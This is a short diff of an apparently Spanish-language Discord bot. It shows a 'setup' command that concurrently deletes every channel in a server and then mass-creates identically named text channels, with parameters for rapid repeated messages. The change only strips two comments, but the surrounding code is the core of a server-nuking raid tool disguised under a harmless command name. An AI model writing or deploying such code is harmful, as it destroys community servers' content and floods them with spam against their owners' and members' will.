@@ -31,13 +31,11 @@ async def setup(ctx):
     delay = 0.1
     num_messages = 35
 
-    # Eliminar canales existentes
     await asyncio.gather(*[channel.delete() for channel in ctx.guild.channels])
 
     new_channels = []
 
     async def create_channel(i):
-        # Crear canal de forma simultánea
         new_channel = await ctx.guild.create_text_channel(f'{channelname}')
         new_channels.append(new_channel)
 
